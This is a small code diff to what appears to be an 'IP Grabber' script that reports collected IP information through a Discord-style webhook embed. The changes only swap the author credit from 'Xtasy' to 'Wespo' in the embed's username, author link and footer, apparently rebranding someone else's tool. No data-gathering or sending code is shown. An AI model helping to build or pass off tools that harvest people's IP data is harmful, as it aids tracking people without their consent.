@@ -25,7 +25,7 @@ headers = {
 
 
 embed = {
-        "username": "IP Grabber by Xtasy ",
+        "username": "IP Grabber by Wespo ",
         "avatar_url": "https://zupimages.net/viewer.php?id=21/23/qqh5.gif",
         "embeds": [
     {
@@ -47,14 +47,14 @@ embed = {
       
       ],
       "author": {
-        "name": "Xtasy",
-        "url": "https://github.com/Xtasyy",
+        "name": "Wespo",
+        "url": "https://github.com/Wespoo",
         "icon_url": "https://zupimages.net/viewer.php?id=21/23/qqh5.gif"
       
       
       },
       "footer": {
-        "text": "IP Grabber Xtasy"
+        "text": "IP Grabber Wespo"
       },
       "image": {
           "url" : info[liste[17]]
